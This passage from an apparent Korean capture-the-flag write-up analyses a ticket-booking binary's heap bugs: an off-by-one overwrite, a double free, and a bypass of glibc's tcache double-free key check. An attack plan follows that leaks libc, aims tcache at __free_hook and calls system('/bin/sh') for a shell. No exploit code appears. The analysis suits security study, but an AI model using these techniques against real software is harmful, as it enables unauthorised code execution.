180w,\n/static/6f3e244131631c7dc77829f654d27dd6/f21e7/14.png 360w,\n/static/6f3e244131631c7dc77829f654d27dd6/fa2f5/14.png 517w\"\n        sizes=\"(max-width: 517px) 100vw, 517px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>ticket_type이 0일 경우 내부 조건</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 608px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 125%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,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'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./15.png\"\n        title=\"./15.png\"\n        src=\"/static/88b23fa0dc0d8f5f575efb9ca5eb723f/18872/15.png\"\n        srcset=\"/static/88b23fa0dc0d8f5f575efb9ca5eb723f/e9ff0/15.png 180w,\n/static/88b23fa0dc0d8f5f575efb9ca5eb723f/f21e7/15.png 360w,\n/static/88b23fa0dc0d8f5f575efb9ca5eb723f/18872/15.png 608w\"\n        sizes=\"(max-width: 608px) 100vw, 608px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>{: width=“50%” height=“50%“}</p>\n<p>free 조건</p>\n<ul>\n<li>내부 조건들을 수행하고 난 후에 <code class=\"language-text\">meal_ticket</code>, <code class=\"language-text\">safari_pass</code>, <code class=\"language-text\">giftshop_coupon</code> 멤버 변수들의 값이 0일 경우 free 를 수행하는 것을 확인할 수 있다.</li>\n<li>하지만 잘 생각해보면 해당 함수에서는 두 번의 free 함수가 존재하며 free를 한 후에 해당 힙 포인터들을 초기화를 하지 않기 때문에 힙 청크가 그대로 유지될 것이기 때문에 <code class=\"language-text\">Double Free</code> 취약점으로 유도할 수 있는 방법이 존재할 것이다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 474px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACIUlEQVQoz4WSTWrcQBCFBQnkpLlBNlk4RBfIPpus4m1OEBMIyIYYB0/M2COPPZZnRlJLGv221Prp6npBmuCMFyEPPrrq0Twoqqz5vIW7YNyucsxWHu78GF4UYSnWCNMcImogpUZVaZTlE1yWWo/17W1zXJbaKkv9whq1XrdIU0JVEfxAY+s38IMcRUkoK0LTEPqOMQwaB2IAkyFEdwzAArAP3GxqDMMYCFQSUIqQZT3yHCjLsTdQitH3BGaAmUdG6bH2/e6YmS1m3gcmyWCKojVx0Jt7tzbeqjIbvzVxIg2zMQAMwNPLzIf0Y2AQdJ+fBaaFRu3tUN2lkGGB5nSO6s1HqFROc/1PQnRfxpGl1K88T720Vo+dE51vHffr1vEuhJN9u3HiTydOkfVOXmgny4Z/8T3Lhtl8Lt/GcW8J0Vmepyzr7Cyzr68Ke3kR29dnof3rR2Jfrtm+vqltd1HbrrtnsfjLobdcNu8fHtSR56l3rlsfWXHcYTBAUROCRCGVA8KgQqv2WzWG/ywCBzzv93+AuiZYUagoud+RDCQFi4iiuU+7qKYorkmImpqGKAwlJUkzIYSkLOsozzvabkuKolrvdo0WQurdrtVWEtSsZhsOTtdcXK25ff2B25OfPK1W03QfZIiJDGtNbIzZe2SeGIa9rxSxdXnZIokV1pEHPw3hn8+wWd0jlCm2mZh4TH1EaQk1Hnlv0HVmeg8ZBoOi0PgNrqkYzWy+fUIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./16.png\"\n        title=\"./16.png\"\n        src=\"/static/c5842db8120b7597252c2d0d926b093f/5595f/16.png\"\n        srcset=\"/static/c5842db8120b7597252c2d0d926b093f/e9ff0/16.png 180w,\n/static/c5842db8120b7597252c2d0d926b093f/f21e7/16.png 360w,\n/static/c5842db8120b7597252c2d0d926b093f/5595f/16.png 474w\"\n        sizes=\"(max-width: 474px) 100vw, 474px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Double Free</p>\n<ul>\n<li>Double Free가 발생할려면 첫 번째로 멤버 변수들을 조작하여 조건을 만족시켜 free를 할 수 있으며 해당 방법으로 다시 하고 싶지만 이미 0으로 세팅되어 있어 다시 조건을 만족할 수 가 없다. 그렇다면 맨 첫 번째 free를 해야 하는데 어떻게 하면 해당 조건을 만족할 수 있을 까?</li>\n</ul>\n<h3 id=\"heap-메모리-해제-과정\" style=\"position:relative;\"><a href=\"#heap-%EB%A9%94%EB%AA%A8%EB%A6%AC-%ED%95%B4%EC%A0%9C-%EA%B3%BC%EC%A0%95\" aria-label=\"heap 메모리 해제 과정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>heap 메모리 해제 과정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 92.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsTAAALEwEAmpwYAAAFLklEQVQ4y1WQaUzTdxzGfyR7sWyvdrwx24slvhCzLGabMpEJDgUpPf5cFd0QbxFEQQSniFyFcSjKLeA45JZjclWBQqG03C09oBcFSkuBoqDbonHY8n8WMMu2b/JJnjzPN8+Lh1AdScRHdIP4CG8Sip/YTQluwacnzsbujsWxfh6y1PW4p32EuLFypCqqcVdTjwR5GShB3CY01RNno7riwelIiua0JxHiPx1KPE4+ceDgc8Jp4XUzsx7AO6naxkqppBnJlWDwHoLi1cHn0W0wi3PBTKwBg1cBVkoVmCmVNDOxxsYqzgP1ND7GV3mJkEPXah3cgvmEeUBNOM2pfBd3Mbxcp2xBRzQ45q9BoO8U9jiqcDjtAdxPtcPJUYUDLhM4cUwLV2cZ7bRjynbwXCt8pBHh7Pz7hOz+zEDc3MY+4nir3LyzSsZPJnThGm/Cfj1djthMBX5On8Dl2HH4Vebgp5xaRMbKEJ0qw41MBa6myOiIm1I7l9cEZmZp8aEvrI5k164h4uIyyjl+fBJcrmJDqXxF0/TvtNFowOLSPJasJmzenZ4uDBlntrTZMgOLZRbLy++ynGwzfSJ4Cmz2xEtCSMf7n3zct22Ho8SJfffBaPuwHhOaZbtofBai8RkMSOcwqVvDlbZqFItFUGlW0T2oRadIA8Ggjp7UrdpzOwfglp6bxf0AnxIuV/ni7Fn1+vlz6j+O/Ciz8TtXYDY9o+UKE/T6FUxpLFixvEW0oBIuZx7h4PcKMFlyBAerwWBO0D84K20eEY3wk0ZdZlVkERIYqDwZEqI+H3ZBe9QvvUbVNq7FmFa3wZcMo1cqR4dkCOr5ZVztLYdzaCWcDvRjP7sH/qcH4MIU0Htc+22eMXXwfBoT5V+TTUggd5IQkvKet4dqv3d20VhcWwtKxGJ7kUSMYokYJUODKOwTIaglB1FPqnC/bwC5QiGyBULk9/XT+f1Cmnudj9MXZc8Yh+XVZOfOQbLPeTQgKEiFgACFXa+gAfovenF2HquWJawuLm8Nf0/QC6lxYUtbTWasLixibXGZBrBR17CEgBCRknlYFUc4uxeIn5/8w317pd+y84pGyrqlEI6a7U8kBvDF0+BLptE7YkZITRXSWgUQDpvxuE+DeoECv/VO0b2DJtvtPj72doRddI8vJYSi5MTbW0aFh2tx6oxyQyBcoa3WFVqpmsbMrAVanRGvXq6jRNkJvnoU0mElpAo19FYrBoeltGpcZ8sVdmNvw5WY7V2+hBx0niSentJtfr6qQEbSQ2WfegYv36xtaEzTmFkyQm3S4/Xb17infIxGtRAypQzymUkons9gSDVGGxfmbUUjvdhTExntWHaBEMbVZoevvh4ivoHjhNWRwK8fFW+W2FQLBhieL2BqaRZ6yxxSR2rRZhzBwpoVMqMGSosB0jk1bf3zhS1H3Inv6qKiv6wII8TfepwkRJocZDAQqimju1UyDNPcrE2j02HeZILeMI2F2XkUylohfWbA21dvoNXrYTaboZvW07DD9nBMgm9qLkVv//UsIRQ/iTAia8hOjwrCbOA9DW7NRcRI4Xq4pMAeKsq1h4sL7JcGC+3+nTz70a5U+8WBfPtmFjaQt+WH9ueucxvugNmSGMVoSiSE05FI3MOqyKHAFsJpShUxqn6BV1MivBqS4NX4L+zmFLCaU/7neTVu/iXDuzoNVHvSDaot+V0hqzrdgVWXRjhtySGsyvQydnlGHqs8o+Af2OUZBczy9C3Y//UrMgpYpZn57Nq0Uqoz3pUS3CJ/A+kjrvkmvMR+AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./17.png\"\n        title=\"./17.png\"\n        src=\"/static/bf37d7336bccfcf8702dd75bf0789a24/37523/17.png\"\n        srcset=\"/static/bf37d7336bccfcf8702dd75bf0789a24/e9ff0/17.png 180w,\n/static/bf37d7336bccfcf8702dd75bf0789a24/f21e7/17.png 360w,\n/static/bf37d7336bccfcf8702dd75bf0789a24/37523/17.png 720w,\n/static/bf37d7336bccfcf8702dd75bf0789a24/98314/17.png 817w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>heap chunk</p>\n<ul>\n<li>pass5 구조체가 동적할당이 되었을 때 해당 heap chunk 메모리 구조를 시각화 하였다.</li>\n</ul>\n<h3 id=\"해제\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EC%A0%9C\" aria-label=\"해제 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>해제</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAADDUlEQVQozx3L20/TdxyH8e/fsevdLZmYZdmWIMF2YZn8SgVmYIsumikTKu3aBeZhPSD9tUYxSwGBBBUVWM+l0LWWYk/0uLa0VFoGkmwsoNZNEzWZrAc+78VdPFevPKzVq9kXLypxKnSNfkhNQhYdhTRioLb7qlqrVwmxW9Mj9miY2K053LqoQatPjXOxYVIkxvF9fAxngkMk9vyINq+q3OIeeJ8J+DF83DFHglMLaJJa8NnQDIS9YRIqlmqfKJzgbHpJs03HxB618JB8CvXHHRCc+IU+V05DOGBHkzxEDb1LqFcaK1+ELtSxfpOPJm6XMHpzm/SzG1Cph2A8eZNM3fdqI90jOGbWSDqMg0w8f1monc5i7PYubtzaJeV0FFdlV2H89g6ZT0+B779ebgwr69jPS1a8Dobxlz+AzXgYBp0WyzIDhS+MV40KHp0WVU+HZYC1zOsa4v77eO4P0KtwhPz+BUz2XUaof4JC8hswXBosH/QN1rGf9N/ht28kyPfIEZKfRtPAHQhO/EpcV7x2qGsRnEUntYCxIy71V/b+c/uFszIUz/TSPZUUh8870X42Qi1dEbRdtFXUf3e+x4bjXkSzRQQyq3Cs5DAafYDlZJ7c0UzNvZLD167h84022QdHF7RSazpVDqRzWM4V6G5yGZbIScRinRRLtWPWrCSpIhxkhogXu4/fYHOrhExyA0GrGzszQSqs71TDa1v4cuF6d9ucnjWaLtU7s6vY/vMlvc398CFcOSvyj9y08bsHk7656ofHvT1sJOMlPH+Nf4JpejHlxPrkLN4k1ujVi2e17M42js1fkRwx8eyju32f+rbyqO6X8W9ljxKlIjLP/sDLvQrtVQnuR6vld3z17zJNzIZ8IUMrLhe8EQ+mEg6kS5sUf1Ko2YtJtDv1Es7Ms4aZi8Jb2QdIPV1H8nGRZjcDsGwFkdhdo1SpiPG0t3Jgou8g48w6Etn1OGrTUbNTj2aHDiIbTy12vsYZ9RA5BiUiK89Edq2AM+kgsvP/O2fTgrNqIbK9/XlwJl1ZZNce+A8lJRiwmR3JzwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./18.png\"\n        title=\"./18.png\"\n        src=\"/static/cfda405330795ac6e4cc794c5ddab6ce/37523/18.png\"\n        srcset=\"/static/cfda405330795ac6e4cc794c5ddab6ce/e9ff0/18.png 180w,\n/static/cfda405330795ac6e4cc794c5ddab6ce/f21e7/18.png 360w,\n/static/cfda405330795ac6e4cc794c5ddab6ce/37523/18.png 720w,\n/static/cfda405330795ac6e4cc794c5ddab6ce/302a4/18.png 1080w,\n/static/cfda405330795ac6e4cc794c5ddab6ce/07a9c/18.png 1440w,\n/static/cfda405330795ac6e4cc794c5ddab6ce/71d2f/18.png 1485w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>free1</p>\n<ul>\n<li>동적할당으로 두 개 <code class=\"language-text\">One ride ticket</code>, <code class=\"language-text\">One day ticket</code> 를 할당하여 해당 사진 처럼 힙 청크를 만든다.</li>\n<li>여기서 우리는 Double Free를 두 번째 인덱스 부분에서 진행할 것이기 때문에 <code class=\"language-text\">one ride ticket</code> 을 할당할 때 <code class=\"language-text\">lastname</code> 부분에 off-by-one 취약점을 이용하여 <code class=\"language-text\">ticket_type</code> 값을 널 바이트로 덮어 쓰게 된다면 <code class=\"language-text\">One ride ticket</code> 도 <code class=\"language-text\">use_ticket</code> 함수를 바탕으로 pass5의 구조체 멤버들을 조작할 수 있게 되기 때문이다.</li>\n<li>GLIBC 2.29 버전 이상의 버전에서는 tcache를 사용하는 힙 청크의 Double Free 검증이 존재한다. 그렇기 때문에 Double Free를 발생시켜 tcache dup 공격 기법을 할 수가 없다.</li>\n<li>ptmalloc2 에서 Double Free 검증 조건과 비슷하게 현재 해제한 포인터 즉, tcache 포인터를 <code class=\"language-text\">tcache_entry</code> 구조체의 <code class=\"language-text\">key</code> 멤버 변수에 대입을 한 후 해제를 할 경우 해당 key 값과 현재 해제하려는 포인터인지를 비교하여 같은 값이라면 <code class=\"language-text\">Double Free</code> 에러 메시지를 출력하고 비정상 종료한다.</li>\n<li>그러면 어떻게 해당 조건을 우회하여 Double Free를 발생시킬 수 있을까?</li>\n<li>우리는 아주 쉽게 우회가 가능하다. <code class=\"language-text\">key</code>의 값을 조작을 Double Free를 발생시키려 할 때 <code class=\"language-text\">key</code> 값이 다르다면은 아무 문제 없이 해제가 되어지기 때문이다.</li>\n<li>tcache double free 검증 여부의 핵심은 바로 <code class=\"language-text\">key</code> 의 값이며 key는 Backword Pointer에 위치하게 되는데 이는 pass5 구조체의 lastname 멤버 변수의 메모리 주소와 동일한 위치이다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACxElEQVQozyXSW0iTcRyH8V/XXXRXN0HQTQQdoKLuIuggutzBDNMKoyAUJkE4S6dOtvfdXJJOLEvG0nTV3PEdiTprc3O1tSKdloNO1kjNZlItTd1e/9+Q7p6Lz+VD+U6e5fYYccF5lykHLSjvt6DEcUfMfXADUpfeTwRS+NUkH2jYfbLXkM2zGnHZY2FKnxllfffY6d62bN5DI+RuznRMMBJJNFbITkeZvCgKicqBvDIXSs6NiIpiP/IaOgMAkWzhHEn91XskV4RsQXEU+YURJqmzIr/0Mc6WhjMnzw/gSHtHk/JSJ9HtSIhF4jOITMyy7mgMPrUK7xubxQmNDjdNVQEQ0V4/Ryc8Dbtsr8az4ddJRCdTrGOoD2GVClP6NnGsWoPeqsogdlzdSj2meixd02LpuhZ9N+pReMENZcGweFH2BPJqc3Bn7bbtB4okh/ZzpZJhri6TruGwpNYySyOH8kIXzMetoimnC90XdYM4ULSFmt1mBB48RODRI3S4LDA4a2C214p37WrUeeuGNrk1mxXOmuOH+zUH7wvWZb/NhleGVhaq5+FVX4WjuzJjdlxDxdPaJqe5iuhWLIhE8jfeJH/BMT6BoVE94gmDOJZoxO2oNgDoKMfcQLbK6lMjtgF87Blm066XzCO48OyFAa8Txmx0shG6oKbVm9AQtccG18DAMiur7PnMWzY5P8fSqyz7408GrZGnfiLaUHTmKLVfrpCH7QIyn2fWxL/La/1fR9nXxTRLr4iZ5EIaKp+9pSv8hsgQduPtwhRGv71H74cgBr7EMDb3DrGZBHQhR4iIaKM6l/aZlLu6J0KI/5xCPPUJXQkfQtNxxOfeIZgcR0W/pa3liY9I6tB/V3j5VIGXT8kEXUomcOv9TeHhF6V2vXv9wxyvlnKd/E6pg58tELh5hcB/l3p0Kfl/Oyv38Kv5Nj0n6Wyif3BszgIYbXqdAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./19.png\"\n        title=\"./19.png\"\n        src=\"/static/1cbb92d6d3bed4f464c542295239f12f/37523/19.png\"\n        srcset=\"/static/1cbb92d6d3bed4f464c542295239f12f/e9ff0/19.png 180w,\n/static/1cbb92d6d3bed4f464c542295239f12f/f21e7/19.png 360w,\n/static/1cbb92d6d3bed4f464c542295239f12f/37523/19.png 720w,\n/static/1cbb92d6d3bed4f464c542295239f12f/302a4/19.png 1080w,\n/static/1cbb92d6d3bed4f464c542295239f12f/07a9c/19.png 1440w,\n/static/1cbb92d6d3bed4f464c542295239f12f/8c833/19.png 1609w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Double Free Bug</p>\n<ul>\n<li><code class=\"language-text\">passes[0]</code> 는 ticket_type이 변조 되어 pass5 구조체 멤버를 조작할 수 있다고 하였다.</li>\n<li>그렇기 때문에 해당 인덱스 기준 ride_count 값을 증가 시키게 된다면 1 바이트 증가하게 되어 키 값이 변조가 될 것이다.</li>\n<li>결국 해당 키 값은 변조가 되어 Double Free가 터지게 된 모습을 확인할 수 있다</li>\n</ul>\n<h1 id=\"해결-방안\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88\" aria-label=\"해결 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>해결 방안</h1>\n<h2 id=\"공격\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9\" aria-label=\"공격 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격</h2>\n<h2 id=\"공격-시나리오\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"공격 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 시나리오</h2>\n<ul>\n<li>라이브러리 주소를 구하기 위해 메모리 릭을 한다.\n<ul>\n<li>view_ticket의 index 변수에 -4 첨자 연산을 바탕으로 stderr 의 주소 값을 노출 시킨후 라이브러리 의 stderr 오프셋과의 계산을 통해 구한다.</li>\n</ul>\n</li>\n<li>passes를 두 장 구매한다. (One ride ticket, One day ticket)\n<ul>\n<li>One ride ticekt은 lastname을 8바이트 입력 하여 off-by-one 버그가 터지게 한다.</li>\n</ul>\n</li>\n<li>One day ticket을 사용하여 해제를 진행한다. (첫 번째 해제)</li>\n<li>One ride ticket을 사용하되 ride_count 값을 증가시켜 One day ticket의 키 값을 변조 시킨후 One day ticketd을 다시 해제하여 Double free를 발생시킨다.\n<ul>\n<li>해당 과정을 총 두 번 반복하여 공격에 필요한 청크를 생성하도록 한다.</li>\n</ul>\n</li>\n<li>Double Free로 인하여 같은 주소 값을 가리키는 tcache는 3개이며 첫 번째 할당할 경우 같은 크기로 할당을 하도록 한다.\n<ul>\n<li>첫 번째 tcache : __free_hook 주소</li>\n<li>두 번째 tcache : “/bin/sh\\x00”</li>\n<li>세 번째 tcache : “lib_system 주소</li>\n</ul>\n</li>\n<li>두 번째 할당한 청크에는 “/bin/sh\\x00” 문자열이 들어 있기 때문에 해당 값을 free(system)의 인자로 사용하여 쉘 권한을 얻도록 한다.</li>\n</ul>\n<h2 id=\"인터페이스\" style=\"position:relative;\"><a href=\"#%EC%9D%B8%ED%84%B0%ED%8E%98%EC%9D%B4%EC%8A%A4\" aria-label=\"인터페이스 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 